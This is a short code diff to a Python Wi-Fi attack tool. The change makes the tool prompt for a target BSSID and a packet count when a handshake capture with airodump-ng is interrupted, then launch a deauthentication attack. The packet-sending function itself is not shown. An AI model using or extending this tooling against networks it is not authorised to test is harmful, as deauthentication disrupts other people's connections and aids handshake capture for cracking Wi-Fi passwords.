@@ -44,8 +44,6 @@ class WifiScan:
         current_mac = getmac.get_mac_address(interface=self.adapter)
         print("Current MAC address:", current_mac)
 
-        deauth_pack = int(input("[+] Input number of deauth packets: "))
-
         try:
             print("[+] Press Control + C to stop scan")
             airodump_process = subprocess.Popen(['airodump-ng', self.adapter])
@@ -63,9 +61,6 @@ class WifiScan:
                 self.adapter
             ])
 
-            client_mac = current_mac
-            self.deauth_attack(client_bssid, deauth_pack, client_mac)
-
     def run_wifi_scan(self):
         user_selection = self.get_user_selection()
 
@@ -80,7 +75,11 @@ class WifiScan:
             try:
                 self.capture_handshake()
             except KeyboardInterrupt:
-                pass
+                print("Interrupted capture. Proceeding with deauth attack...")
+                client_bssid = input("[+] Input client BSSID: ")
+                deauth_pack = int(input("[+] Input number of deauth packets: "))
+                client_mac = getmac.get_mac_address(interface=self.adapter)
+                self.deauth_attack(client_bssid, deauth_pack, client_mac)
 
     @staticmethod
     def get_user_selection():
